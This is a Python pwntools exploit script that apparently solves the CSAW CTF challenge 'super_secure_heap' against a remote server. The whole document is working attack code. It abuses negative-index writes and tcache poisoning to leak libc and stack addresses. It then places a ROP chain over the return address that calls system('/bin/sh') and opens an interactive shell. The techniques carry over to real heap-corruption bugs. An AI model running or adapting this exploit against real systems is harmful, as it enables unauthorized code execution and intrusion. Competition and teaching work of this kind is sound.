from pwn import *
from enum import Enum
context.log_level = "debug"
libc_path = './libc.so.6'
context.binary = "./super_secure_heap"
context.terminal = ["tmux", "splitw", "-h"]
libc = ELF(libc_path)

class Obj(Enum):
    KEYS = 1
    CONTENT = 2
    EXIT = 3

def exploit():
    # p = process(["./ld-2.31.so", "./super_secure_heap"])
    p = remote('pwn.csaw.io', 9998)

    def handle(obj):
        p.recvuntil(b'content?')
        for _ in range(5):
            p.recvline()
        p.sendline(str(obj.value))

    def alloc(obj, size):
        handle(obj)
        for _ in range(8):
            p.recvline()
        p.sendline('1')
        p.recvline()
        p.sendline(str(size))

    def free(obj, idx):
        handle(obj)
        for _ in range(8):
            p.recvline()
        p.sendline('2')
        p.recvline()
        p.sendline(str(idx))

    def read(obj, idx):
        handle(obj)
        for _ in range(8):
            p.recvline()
        p.sendline('4')
        p.recvline()
        p.sendline(str(idx))
        p.recvline()
        return p.recvuntil(b'Do ')[:-3]

    def edit(obj, idx, len, value):
        handle(obj)
        for _ in range(8):
            p.recvline()
        p.sendline('3')
        p.recvline()
        p.sendline(str(idx))
        p.recvline()
        p.sendline(str(len))
        p.recvline()
        p.sendline(value)
    for _ in range(10):
        alloc(Obj.KEYS, 2048)
    alloc(Obj.CONTENT, 9)
    alloc(Obj.CONTENT, 9)
    free(Obj.CONTENT, 0)
    free(Obj.CONTENT, 1)
    alloc(Obj.CONTENT, 2048)
    alloc(Obj.CONTENT, 2048)
    # alloc(2048)
    free(Obj.CONTENT, 2)
    leak = read(Obj.CONTENT, 2)
    print(leak, len(leak))
    libc_leak = u64(leak+b'\x00\x00')
    success(hex(libc_leak))
    libc.address = libc_leak - 0x1ecbe0
    environ = libc.symbols['environ']
    edit(Obj.KEYS, -15, 9, p64(environ))
    alloc(Obj.CONTENT, 9) # 4
    alloc(Obj.CONTENT, 9) # 5 - should allocate over environ
    leak = read(Obj.CONTENT, 5)
    stack_leak = u64(leak+b'\x00\x00')
    success(hex(stack_leak))

    bin_sh = next(libc.search(b'/bin/sh'))
    rop = ROP(libc)
    payload = p64(rop.rdi.address+1)
    payload += p64(rop.rdi.address+1)
    payload += p64(rop.rdi.address)
    payload += p64(bin_sh)
    payload += p64(rop.rdi.address + 1)
    payload += p64(libc.symbols['system'])
    payload += p64(libc.symbols['exit'])

    alloc(Obj.CONTENT, len(payload)+1) # 6
    alloc(Obj.CONTENT, len(payload)+1) # 7
    free(Obj.CONTENT, 6)
    free(Obj.CONTENT, 7)
    edit(Obj.KEYS, -9, 9, p64(stack_leak - 0x100))
    alloc(Obj.CONTENT, len(payload)+1) # 8
    alloc(Obj.CONTENT, len(payload)+1) # 9 - should allocate over ret
    edit(Obj.KEYS, -7, len(payload)+1, payload)
    handle(Obj.EXIT)
    p.interactive()


if __name__ == "__main__":
    exploit()